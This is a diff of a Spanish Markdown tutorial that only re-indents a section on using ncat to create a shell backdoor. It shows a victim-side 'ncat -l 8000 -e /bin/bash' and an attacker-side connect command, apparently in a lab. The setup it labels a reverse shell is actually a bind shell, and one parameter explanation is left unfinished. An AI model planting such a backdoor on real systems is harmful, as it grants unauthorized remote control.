@@ -89,22 +89,22 @@ Recomendación: Ver Exploring bash Reverse Shell ➡ https://www.youtube.com/wat
 El comando ncat es una versión mejorada y más segura de Netcat, incluida en la suite de herramientas Nmap. El comando ncat o nc, también se pueden utilizar para crear puertas traseras en nuestros sistemas. La puerta se crearía de la siguiente manera:
 
 - En la máquina atacante: Configurar ncat para que escuche en un puerto específico. Esto se hace para esperar una conexión entrante desde la máquina objetivo.
-```
-ncat 192.168.0.200 8000
-```
-![](capturas/shell-reversa-ncat-mv-atacante.png)
+  ```
+  ncat 192.168.0.200 8000
+  ```
+  ![](capturas/shell-reversa-ncat-mv-atacante.png)
 
 - En la Máquina Víctima: 
-```
-ncat -l 8000 -e /bin/bash
-```
-Explicación de los parámetros:
--e /bin/bash le dice a ncat que ejecute /bin/bash y envíe su entrada/salida a través de la conexión de red, estableciendo así una shell reversa.
--l xxxxx
-![](capturas/shell-reversa-ncat-mv-victima.png)
+  ```
+  ncat -l 8000 -e /bin/bash
+  ```
+  Explicación de los parámetros:
+  -e /bin/bash le dice a ncat que ejecute /bin/bash y envíe su entrada/salida a través de la conexión de red, estableciendo así una shell reversa.
+  -l xxxxx
+  ![](capturas/shell-reversa-ncat-mv-victima.png)
 
 - Establecido los dos puntos anteriores ya podemos desde la máquina atacante usar la shell reversa:
-![](capturas/shell-reversa-ncat-mv-atacante-2.png)
+  ![](capturas/shell-reversa-ncat-mv-atacante-2.png)
 
 
 Debemos de tener en cuenta:
